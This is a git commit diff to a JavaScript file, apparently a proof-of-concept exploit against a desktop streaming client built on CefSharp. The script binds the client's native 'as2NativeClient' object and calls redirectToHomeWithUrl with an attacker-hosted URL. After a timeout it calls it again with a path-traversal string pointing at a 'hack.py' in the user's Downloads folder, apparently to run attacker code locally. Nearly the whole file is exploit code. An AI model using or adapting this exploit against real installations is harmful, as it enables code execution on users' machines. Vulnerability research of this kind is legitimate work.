1cd78445160fa96487c285aeea75c60cc97cae35
Rakesh Mane <rakeshmane12345@gmail.com>
2020-07-09 22:41:30 +0530

    Update tmp1.js

--- tmp1.js
+++ tmp1.js
@@ -1,28 +1,12 @@
 
-        window.CefSharp.BindObjectAsync("as2NativeClient")
+window.CefSharp.BindObjectAsync("as2NativeClient")
         .then((result) => {
           if(window.as2NativeClient) {
                   
   
-                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/1");                 
-                 /* window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                   window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")*/
-
-                   //setTimeout('window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py");alert();',3000)   
-                 
+                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");                 
                  
 
-                  // C:\Users\rakesh\AppData\Local\AppStreamClient\app-1.1.160>dir .\..\..\..\..\Downloads
-           
-            //setTimeout('window.as2NativeClient.redirectToHomeWithUrl(".\..\..\..\..\Downloads\hack.py")',2000)      
-            
-
-            //window.as2NativeClient.redirectToHomeWithUrl("hack.py")
-             
-                  
          }
         })
 
@@ -31,17 +15,10 @@ setTimeout(`
         window.CefSharp.BindObjectAsync("as2NativeClient")
         .then((result) => {
           if(window.as2NativeClient) {
-                  
   
-                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/2");                 
-                 /* window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                   window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")*/
-
+                        window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
 
          }
         })
 
-`,10000)
+`,6000)
